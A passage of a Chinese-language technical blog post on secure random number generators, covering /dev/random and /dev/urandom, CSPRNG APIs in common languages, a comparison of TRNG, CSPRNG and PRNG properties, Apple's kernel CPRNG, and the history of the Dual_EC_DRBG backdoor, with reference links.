MacOS 和 FreeBSD.</li>\n</ul>\n<p>类Unix系统通过如下两个虚拟设备提供 CSPRNG:</p>\n<ul>\n<li>&#x2F;dev&#x2F;random（受限阻塞随机生成器）: 从这个设备中读取到的是内核熵池中已经收集好的熵，如果熵池空了，此设备会一直阻塞，直到收集到新的环境噪声。</li>\n<li>&#x2F;dev&#x2F;urandom（不受限非阻塞随机生成器）: 它可能会返回内核熵池中的熵，也可能返回使用「之前收集的熵 + CSPRNG」计算出的安全伪随机数。它不会阻塞。</li>\n</ul>\n<p>CSPRNG 经常被用于以下场景：</p>\n<ul>\n<li>随机密钥的产生。比如为对称密码算法加密提供随机密钥。</li>\n<li>一次性随机序列的产生。比如用于通信协议，可以防止回放攻击。</li>\n<li>用于口令保护的盐(salt)的产生，可以防止口令的预计算攻击（也叫字典攻击）</li>\n<li>一次一密。比如直接拿来跟明文异或生成密文，但是只能用一次</li>\n</ul>\n<p>常见编程语言的 CSPRNG 接口或库如下：</p>\n<ul>\n<li>Java: <code>java.security.SecureRandom</code></li>\n<li>Python: <code>secrets</code> 库或者 <code>os.urandom()</code></li>\n<li>C#: <code>System.Security.Cryptography.RandomNumberGenerator.Create()</code></li>\n<li>JavaScript: 客户端可使用 <code>window.crypto.getRandomValues(Uint8Array)</code>，服务端可使用 <code>crypto.randomBytes()</code></li>\n</ul>\n<h2 id=\"四、对比分析\"><a href=\"#四、对比分析\" class=\"headerlink\" title=\"四、对比分析\"></a>四、对比分析</h2><table>\n<thead>\n<tr>\n<th align=\"center\">TRNG</th>\n<th align=\"center\">CSPRNG</th>\n<th align=\"center\">PRNG</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">不可重现性</td>\n<td align=\"center\"></td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">不可预测性</td>\n<td align=\"center\">不可预测性</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">不可回溯性</td>\n<td align=\"center\">不可回溯性</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">无偏性</td>\n<td align=\"center\">无偏性</td>\n<td align=\"center\">无偏性</td>\n</tr>\n</tbody></table>\n<ul>\n<li>不可重现性：相同的输入必须生成不同的输出</li>\n<li>不可预测性：即使有人获知了该 PRNG 的 k 位，他也无法使用合理的资源预测第 k+1 位的值</li>\n<li>不可回溯性：如果攻击者猜出了 PRNG 的内部状态或该状态因某种原因而泄漏，攻击者也无法重建出内部状态泄漏之前生成的所有随机数</li>\n<li>无偏性：任何数均有平等出现的机会</li>\n</ul>\n<hr>\n<h2 id=\"附录一：Apple-提供的CSPRNG\"><a href=\"#附录一：Apple-提供的CSPRNG\" class=\"headerlink\" title=\"附录一：Apple 提供的CSPRNG\"></a>附录一：Apple 提供的CSPRNG</h2><p>Apple 为此提供了运行在 iOS、iPadOS、macOS、Apple tvOS 和 watchOS 内核中的受信任软件 CPRNG（&#x3D; CSPRNG）。它负责聚合系统中的原始熵并为内核和用户空间的使用者提供安全的随机数。</p>\n<p>内核 CPRNG 源自启动过程中的多个熵源并存在于设备的整个生命周期。这些来源包括（取决于可用性）：</p>\n<ul>\n<li>安全隔区硬件 TRNG</li>\n<li>启动过程中所收集基于时序的时间误差</li>\n<li>从硬件中断收集的熵</li>\n<li>用于启动过程中保持熵的种子文件</li>\n<li>Intel 随机指令，例如 RDSEED 和 RDRAND（仅限基于 Intel 的 Mac）</li>\n</ul>\n<p>内核 CPRNG 的设计源自 Fortuna 算法，旨在满足 256 位安全级别。它使用以下 API 为用户空间使用者提供高质量的随机数：</p>\n<ul>\n<li>getentropy(2) 系统调用</li>\n<li>随机设备 (&#x2F;dev&#x2F;random)</li>\n</ul>\n<p>内核 CPRNG 通过写入随机设备接受用户提供的熵。</p>\n<h2 id=\"附录二：DUAL-EC-DRBG-的安全漏洞\"><a href=\"#附录二：DUAL-EC-DRBG-的安全漏洞\" class=\"headerlink\" title=\"附录二：DUAL_EC_DRBG 的安全漏洞\"></a>附录二：DUAL_EC_DRBG 的安全漏洞</h2><p>2005年，NIST SP 800-90A草案公开发布，其包含四个随机数生成算法：HASH_DRBG, HMAC_DRBG, CTR_DRBG, DUAL_EC_DRBG。</p>\n<p>2006年，Kristian Gjøsteen公开了其报告，称“Dual_EC_DRBG is not cryptographically sound”，并构造了一个具有0.0011优势 bit-predictor，证明了其不满足 CSPRNG的随机数发生器设计原理。</p>\n<p>在Crypto 2007（原美密会，现为国际密码会议）会议上，Bruce Schneier的报告宣布该标准中存在技术后门，使得拥有某特殊资源的攻击者能够轻而易举地攻击其中的Dual ECC DRBG 随机数产生器算法，从而得到该算法后续的所有随机数值。</p>\n<p>2013年，Edward Snowden泄露的内部备忘录曝光了 NSA’s Bullrun 项目，显示该项目在 Dual_EC_DRBG 中植入了一个后门。</p>\n<p>美国EMC公司的RSA事业本部于2013年9月19日宣布，该公司已向其加密工具“RSA BSAFE”及“RSA Data Protection Manager”的客户发出呼吁，不要使用其默认的 Dual_EC_DRBG 技术标准，RSA目前正在审查其所有的产品。</p>\n<p>路透社报道，NSA与RSA之间存在一笔$10 million的交易，其要求RSA在BSAFE中将Dual_EC_DRBG 设为默认的CSPRNG。<br>RSA公司发表声明，直接否认与NSA有任何的秘密接触，以便在BSAFE加密库中放置有缺陷的随机数生成器算法。但是RAS并没有否认或者解释之前与NSA之间$10 million的交易。</p>\n<p>总结：<br>Dual_EC_DRBG算法可能潜伏着一个后门。如果以特定方式选择定义算法的一个参数，NSA将可能预测出算法产生的随机数。此次，受影响的加密工具“RSA BSAFE”及“RSA Data Protection Manager”中， RSA BSAFE是用来开发安全应用的工具套件，因此，使用该工具开发的很多应用都可能使用了“Dual_EC_DRBG”，并在市场上使用。RSA Data Protection Manager是用来进行数据加密的工具。这些产品的默认随机数生成算法均为“Dual_EC_DRBG”。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"技术分析\"><a href=\"#技术分析\" class=\"headerlink\" title=\"技术分析\"></a>技术分析</h3><ul>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-4-secure-random-generators/\">写给开发人员的实用密码学（四）—— 安全随机数生成器 CSPRNG</a></li>\n<li><a href=\"https://securitygossip.com/blog/2020/03/16/pseudorandom-black-swans-cache-attacks-on-ctr-drbg/\">CTR-DRBG的缓存侧信道攻击方法</a></li>\n<li><a href=\"https://blog.51cto.com/u_13640625/3027985\">伪随机数生成器（ctr_drbg）的配置与使用</a></li>\n<li><a href=\"https://blog.csdn.net/a00553344/article/details/3978312\">随机数发生器设计原理及实现</a></li>\n<li><a href=\"https://ms2008.github.io/2017/10/24/PRNG/\">正确认识随机数 - 北京车牌摇号的算法是公平的</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"%E5%9F%BA%E4%BA%8E%E5%A4%9A%E7%BA%A7%E5%8F%8D%E9%A6%88%E7%8E%AF%E5%BD%A2%E6%8C%AF%E8%8D%A1%E5%99%A8%E7%9A%84%E7%9C%9F%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8%E8%AE%BE%E8%AE%A1.pdf\">基于多级反馈环形振荡器的真随机数发生器设计</a></li>\n<li><a href=\"%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%9C%9F%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8.pdf\">安全系统的真随机数发生器</a></li>\n<li><a href=\"%E7%9C%9F%E9%9A%8F%E6%9C%BA%E6%95%B0%E5%8F%91%E7%94%9F%E5%99%A8%E7%9A%84%E5%90%8E%E5%A4%84%E7%90%86%E6%96%B9%E6%B3%95.pdf\">真随机数发生器的后处理方法</a></li>\n</ul>\n"}]